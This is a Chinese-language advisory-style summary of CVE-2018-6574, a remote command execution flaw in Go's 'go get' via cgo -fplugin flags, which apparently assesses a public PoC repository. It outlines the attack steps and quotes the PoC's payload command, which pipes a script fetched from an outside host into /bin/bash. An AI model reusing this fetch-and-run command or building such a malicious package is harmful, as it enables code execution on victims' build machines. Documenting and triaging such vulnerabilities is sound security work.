## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)